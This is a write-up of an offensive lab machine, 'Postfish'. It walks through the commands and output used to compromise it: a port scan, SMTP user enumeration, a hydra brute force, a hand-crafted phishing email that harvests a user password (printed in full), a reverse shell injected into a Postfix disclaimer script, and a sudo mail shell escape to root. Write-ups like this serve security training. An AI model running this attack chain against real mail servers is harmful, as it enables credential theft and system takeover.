`nmap -A -T4 -p- 192.168.217.137`

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
25/tcp  open  smtp     Postfix smtpd
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: RESP-CODES CAPA UIDL AUTH-RESP-CODE TOP PIPELINING USER SASL(PLAIN) STLS
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
|_imap-capabilities: IMAP4rev1 LOGIN-REFERRALS AUTH=PLAINA0001 have OK post-login LITERAL+ Pre-login IDLE ID STARTTLS listed capabilities more SASL-IR ENABLE
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: IMAP4rev1 LOGIN-REFERRALS Pre-login OK post-login LITERAL+ have IDLE ID AUTH=PLAINA0001 listed capabilities more SASL-IR ENABLE
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: UIDL RESP-CODES PIPELINING CAPA USER AUTH-RESP-CODE SASL(PLAIN) TOP
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
Device type: general purpose|router
**Running: Linux 5.X, MikroTik RouterOS 7.X**
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host:  postfish.off; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   38.62 ms 192.168.45.1
2   38.60 ms 192.168.45.254
3   39.57 ms 192.168.251.1
4   39.63 ms 192.168.217.137

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.69 seconds

```




```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://postfish.off/FUZZ
```

Nothing was found, besides the Teams page which we would as part of our enumeration and the rest of the services appear email related. That being said names on a public site can allow us to potentially enumerate users through smtp. So I am going to generate a userlist to test using username-anarchy

![](Images/Pasted%20image%2020250505210902.png)

We are able to determine the user name scheme as first.last. Using this we can potentially try and brute force some users.

```
claire.madison
mike.ross
brian.moore 
sarah.lorem 
```

Those didn't lead to any authentications, so instead lets try and use cewl to scrape and potentially generate more users to test.

```
cewl -d 5 -m 3 http://postfish.off/team.html -w ./cewl.txt
```

We get some new ones.

```
192.168.217.137: Legal exists
192.168.217.137: Sales exists
```


```
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt $ip pop3 -V -f
```

Nothing was found, with rock you. So lets think simple and just test username as username and password. After some testing we get authentication.

![](Images/Pasted%20image%2020250505212117.png)

The email we can retrieve seems to be an email from IT Stating that they will be resetting passwords? Is this supposed to be a phishing box?

![](Images/Pasted%20image%2020250505212222.png)

We can compose an email from IT while having an NC listener on port 80 to grab anything typed.

```
220 postfish.off ESMTP Postfix (Ubuntu)
MAIL FROM: it@postfish.off
250 2.1.0 Ok
RCPT TO: brian.moore@postfish.off
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: Password Resetreset password at this link <http://192.168.45.244/>
.
250 2.0.0 Ok: queued as 1C3EA4023A
QUIT
221 2.0.0 Bye
```

Come on internal IT-Sec train your users!

![](Images/Pasted%20image%2020250505212811.png)

`brian.moore:EternaLSunshinE`

Login via SSH to grab local.txt and move forward.

![](Images/Pasted%20image%2020250505212957.png)

# Post Exploitation

Run Linpeas and wait for output. 

The only real lead I found was an executable not typical for Linux `/etc/postfix/disclaimer` upon looking at the executable it appears to be run by a diff user that could lead to lateral user move would could lead to escalation.

![](Images/Pasted%20image%2020250505215010.png)

Lets add a bash reverse shell and see if we can get execution through sending another email as this is an email disclaimer. Like when an external email is received. 

![](Images/Pasted%20image%2020250505215209.png)

```
Trying 192.168.217.137...
Connected to 192.168.217.137.
Escape character is '^]'.
220 postfish.off ESMTP Postfix (Ubuntu)
MAIL FROM: it@postfish.off
250 2.1.0 Ok
RCPT TO: brian.moore@postfish.off
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
hi
.
250 2.0.0 Ok: queued as 313B34043F
quit
221 2.0.0 Bye
Connection closed by foreign host.
```

This triggers our shell.

![](Images/Pasted%20image%2020250505215326.png)

Quick manual enumeration finds us our escalation path.

![](Images/Pasted%20image%2020250505215355.png)

```
sudo mail --exec='!/bin/sh'
```

![](Images/Pasted%20image%2020250505215443.png)